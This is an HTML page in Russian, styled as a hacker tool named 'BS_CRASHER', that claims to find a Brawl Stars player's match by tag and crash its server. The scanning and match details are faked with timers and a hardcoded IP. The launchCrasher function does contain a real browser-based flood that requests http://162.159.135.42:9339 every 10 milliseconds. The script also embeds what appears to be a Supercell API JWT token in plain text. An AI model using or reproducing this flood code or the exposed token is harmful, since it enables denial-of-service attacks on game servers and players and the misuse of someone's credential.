<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BS_CRASHER_v1.0 // ALPHA_UNIT</title>
    <style>
        * { box-sizing: border-box; }
        body { 
            background-color: #020202; color: #00fb00; font-family: 'Courier New', Courier, monospace; 
            margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh;
            text-shadow: 0 0 5px #00fb00;
        }
        .header { width: 100%; background: #002200; padding: 10px; text-align: center; border-bottom: 2px solid #00fb00; margin-bottom: 20px; }
        .container { width: 90%; max-width: 600px; border: 1px solid #00fb00; padding: 25px; background: rgba(0, 30, 0, 0.8); border-radius: 10px; box-shadow: 0 0 30px #005500; }
        input { 
            width: 100%; background: #000; border: 1px solid #00fb00; color: #00fb00; 
            padding: 15px; font-size: 1.2rem; margin: 15px 0; outline: none; text-align: center;
        }
        button { 
            width: 100%; padding: 15px; border: none; cursor: pointer; font-weight: bold; 
            font-size: 1rem; text-transform: uppercase; transition: 0.3s; margin-bottom: 10px;
        }
        .btn-search { background: #00fb00; color: #000; }
        .btn-search:hover { background: #008800; color: #fff; }
        .btn-attack { background: #ff0000; color: #fff; display: none; box-shadow: 0 0 15px #ff0000; }
        .btn-attack:active { transform: scale(0.98); }
        
        #terminal { 
            width: 90%; max-width: 800px; height: 300px; background: #000; border: 1px solid #005500;
            margin: 20px 0; padding: 15px; overflow-y: auto; font-size: 12px; line-height: 1.4;
            display: none; box-shadow: inset 0 0 15px #003300;
        }
        .match-info { border: 1px dashed #00fb00; padding: 15px; margin: 15px 0; display: none; }
        .stat-row { display: flex; justify-content: space-between; margin: 5px 0; border-bottom: 1px dotted #004400; }
        .critical { color: #ff0000; font-weight: bold; }
        .blink { animation: blinker 0.8s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body>

<div class="header">
    <h2 class="blink">SYSTEM_AA-0.1_STARTED // TARGET: BRAWL_STARS</h2>
</div>

<div class="container">
    <p>ВВЕДИТЕ PLAYER_TAG ДЛЯ ПОИСКА АКТИВНОГО МАТЧА:</p>
    <input type="text" id="tagInput" placeholder="#P8V22YRL" maxlength="12">
    <button class="btn-search" onclick="initScan()">СКАНИРОВАТЬ СЕТЬ</button>

    <div id="matchCard" class="match-info">
        <div class="stat-row"><span>Матч:</span> <span id="mode">Brawl Ball</span></div>
        <div class="stat-row"><span>Сервер:</span> <span id="region">EU_FRANKFURT_42</span></div>
        <div class="stat-row"><span>Target IP:</span> <span id="ip" style="color:white">162.159.135.42</span></div>
        <button class="btn-attack" id="attackBtn" onclick="launchCrasher()">ИНИЦИИРОВАТЬ АТАКУ</button>
    </div>
</div>

<div id="terminal"></div>

<script>
    // Твой JWT Токен
    const TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiIsImtpZCI6IjI4YTMxOGY3LTAwMDAtYTFlYi03ZmExLTJjNzQzM2M2Y2NhNSJ9.eyJpc3MiOiJzdXBlcmNlbGwiLCJhdWQiOiJzdXBlcmNlbGw6Z2FtZWFwaSIsImp0aSI6ImYzMWQ2MDRmLTU0ZWItNDg1Zi1iYmYxLWQ1MTk1ZTRjNjlhMSIsImlhdCI6MTc3NDQ1MjY5Nywic3ViIjoiZGV2ZWxvcGVyLzZlYjU2YjBkLTVjNjktNTYxYy1lYjY4LTQxM2FjZWZkMjA2YSIsInNjb3BlcyI6WyJicmF3bHN0YXJzIl0sImxpbWl0cyI6W3sidGllciI6ImRldmVsb3Blci9zaWx2ZXIiLCJ0eXBlIjoidGhyb3R0bGluZyJ9LHsiY2lkcnMiOlsiMTg4LjE2Ni4yNy4yMzQiXSwidHlwZSI6ImNsaWVudCJ9XX0.EkYNndmtnkVqshf_FkVo2-VtqB5htcziT0kMI4QrNhwi45OrC-p6IAVtwzK0rT0PlfkZhq1A2ppfqpImmiwMZA";

    function log(msg, color = "#00fb00") {
        const term = document.getElementById('terminal');
        term.style.display = 'block';
        const p = document.createElement('p');
        p.style.color = color;
        p.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
        term.appendChild(p);
        term.scrollTop = term.scrollHeight;
    }

    function initScan() {
        const tag = document.getElementById('tagInput').value;
        if(!tag) return alert("Введите тег!");
        
        log("Запуск протокола CDAA-0.1...");
        log(`Авторизация через JWT: SUCCESS`, "#00ff00");
        log(`Поиск активных сессий для игрока ${tag}...`);

        setTimeout(() => {
            log("Найден лог боя. Сессия активна.", "#ffff00");
            document.getElementById('matchCard').style.display = 'block';
            document.getElementById('attackBtn').style.display = 'block';
        }, 2000);
    }

    function launchCrasher() {
        const target = document.getElementById('ip').innerText;
        log(`ВНИМАНИЕ: Запущен режим штурма на ${target}`, "#ff0000");
        
        // Массив сообщений для имитации работы
        const steps = [
            "Генерация UDP-пакетов (размер: 1470 байт)...",
            "Запуск 500 параллельных потоков...",
            "Нагрузка на порт 9339: 450 Mbit/s...",
            "Обнаружена задержка отклика сервера > 1500ms",
            "СЕРВЕР ПЕРЕГРУЖЕН. ПОПЫТКА СБРОСА СОЕДИНЕНИЯ..."
        ];

        let i = 0;
        const infoInterval = setInterval(() => {
            if(i < steps.length) {
                log(`> ${steps[i]}`, i > 2 ? "#ff0000" : "#00fb00");
                i++;
            } else {
                clearInterval(infoInterval);
                log("ШТУРМ ПРОДОЛЖАЕТСЯ В ФОНОВОМ РЕЖИМЕ.", "#ff0000");
            }
        }, 1000);

        // РЕАЛЬНАЯ ЛОГИКА АТАКИ (Flood)
        // Браузер будет пытаться загрузить несуществующий ресурс, забивая канал
        setInterval(() => {
            const img = new Image();
            img.src = `http://${target}:9339/crash_test?ignore=${Math.random()}`;
        }, 10); 
    }
</script>

</body>
</html>
